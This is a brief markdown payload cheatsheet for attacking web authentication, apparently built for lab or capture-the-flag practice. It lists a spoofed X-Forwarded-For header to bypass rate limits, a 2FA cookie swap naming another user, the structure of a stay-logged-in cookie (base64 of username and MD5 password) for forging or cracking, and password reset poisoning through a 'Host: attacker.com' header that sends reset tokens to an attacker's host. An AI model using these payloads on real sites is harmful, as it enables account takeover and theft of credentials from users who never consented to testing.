# Payload Cheatsheet

## Authentication

```
# Rate limit bypass
X-Forwarded-For: 1.1.1.1

# 2FA cookie swap
verify=carlos

# Stay logged in cookie format
base64(username:md5(password))

# Password reset poisoning
Host: attacker.com
```
